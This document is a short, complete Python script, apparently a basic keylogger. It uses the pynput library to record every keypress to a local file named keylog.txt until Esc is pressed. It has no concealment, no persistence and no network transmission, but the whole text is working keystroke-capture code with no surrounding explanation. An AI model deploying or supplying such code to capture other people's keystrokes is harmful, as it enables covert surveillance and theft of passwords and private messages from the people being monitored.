from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as file:
            file.write(str(key) + "\n")

    except Exception as e:
        print(f"Error: {str(e)}")


def on_release(key):
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
